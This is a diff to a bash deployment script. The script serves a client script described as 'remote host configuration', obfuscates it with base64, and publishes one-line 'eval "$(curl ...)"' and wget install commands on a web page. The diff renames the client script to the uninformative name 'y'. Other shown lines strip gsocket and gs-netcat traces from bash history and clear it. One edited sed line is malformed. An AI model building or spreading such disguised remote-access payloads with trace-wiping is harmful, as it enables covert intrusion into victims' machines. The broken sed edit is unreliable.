@@ -104,7 +104,7 @@ RANDOM_TOKEN=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 32)
 sed -i "s/changeme_to_secure_random_string/$RANDOM_TOKEN/g" /tmp/log_receiver.php
 sudo mv /tmp/log_receiver.php "$SERVER_ROOT/log_receiver.php"
 
-cat > /tmp/client_setup.sh << 'EOF'
+cat > /tmp/y << 'EOF'
 #!/bin/bash
 # Remote host configuration script
 # This script sets up SSH, Wake-on-LAN, power button modification,
@@ -512,7 +512,7 @@ rm -f /tmp/setup_* 2>/dev/null
 if [ -f "$HOME/.bash_history" ]; then
     sed -i '/gsocket/d' "$HOME/.bash_history"
     sed -i '/gs-netcat/d' "$HOME/.bash_history"
-    sed -i '/setup_script/d' "$HOME/.bash_history"
+    sed -i 'setup_script/d' "$HOME/.bash_history"
 fi
 
 history -c
@@ -549,16 +549,16 @@ EOF
 SERVER_IP=$(ip -4 addr show | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | grep -v "127.0.0.1" | head -n 1)
 
 # Replace placeholders with actual values
-sed -i "s|SERVER_PLACEHOLDER|$SERVER_IP|g" /tmp/client_setup.sh
-sed -i "s|TOKEN_PLACEHOLDER|$RANDOM_TOKEN|g" /tmp/client_setup.sh
+sed -i "s|SERVER_PLACEHOLDER|$SERVER_IP|g" /tmp/y
+sed -i "s|TOKEN_PLACEHOLDER|$RANDOM_TOKEN|g" /tmp/y
 
-sudo mv /tmp/client_setup.sh "$SERVER_ROOT/client_setup.sh"
-sudo chmod +x "$SERVER_ROOT/client_setup.sh"
+sudo mv /tmp/y "$SERVER_ROOT/y"
+sudo chmod +x "$SERVER_ROOT/y"
 
 cat > /tmp/obfuscate.php << 'EOF'
 <?php
 // Simple script to obfuscate the client setup script
-$script = file_get_contents('/srv/http/deployment/client_setup.sh');
+$script = file_get_contents('/srv/http/deployment/y');
 
 $encoded = base64_encode($script);
 
@@ -646,14 +646,14 @@ cat > /tmp/index.html << EOF
     <div class="variant">
       <span class="label">Using curl:</span>
       <div class="command">
-eval "\$(curl -fsSL http://${SERVER_IP}/deployment/client_setup.sh)"
+eval "\$(curl -fsSL http://${SERVER_IP}/deployment/y)"
       </div>
     </div>
     
     <div class="variant">
       <span class="label">Using wget:</span>
       <div class="command">
-eval "\$(wget -O- http://${SERVER_IP}/deployment/client_setup.sh)"
+eval "\$(wget -qO- http://${SERVER_IP}/deployment/y)"
       </div>
     </div>
     
@@ -908,7 +908,7 @@ echo "=============================================================="
 echo "Server URL: http://$SERVER_IP/deployment"
 echo "Admin Page: http://$SERVER_IP/deployment/admin.php"
 echo "Admin Password: $ADMIN_PASSWORD"
-echo "Client Setup Command: eval \"\$(curl -fsSL http://$SERVER_IP/deployment/client_setup.sh)\""
+echo "Client Setup Command: eval \"\$(curl -fsSL http://$SERVER_IP/deployment/y)\""
 echo "=============================================================="
 echo "Secret Token for accessing logs: $RANDOM_TOKEN"
 echo "=============================================================="
